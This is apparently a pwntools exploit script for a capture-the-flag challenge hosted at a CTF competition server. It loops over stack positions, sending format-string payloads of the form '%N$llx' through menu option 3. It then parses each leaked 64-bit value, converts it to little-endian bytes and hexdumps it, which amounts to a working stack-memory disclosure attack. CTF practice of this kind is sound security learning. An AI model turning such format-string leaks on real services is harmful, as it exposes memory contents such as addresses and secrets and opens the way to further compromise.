from pwn import *
p = remote('pwn-notebook.2021.ctfcompetition.com', 1337);
i = 1
def convstr(s):
	while len(s) < 16:
		s = '0' + s
	b = bytearray()
	for i in range(0, 16, 2):
		b.append(int(s[i] + s[i+1], 16))
	b.reverse()
	return bytes(b) 
while True:
	p.sendline(b'3')
	#p.sendline(b'%' + str(i).encode() + b'$x')
	p.sendline(b'%' + str(i).encode() + b'$llx')
	p.recvuntil(b'< ')
	data = convstr(str(p.recvuntil(b' >\n')).split(' ')[0].split("'")[1])
	print(hexdump(data))
	p.recvuntil(b'<')
	i += 1
	
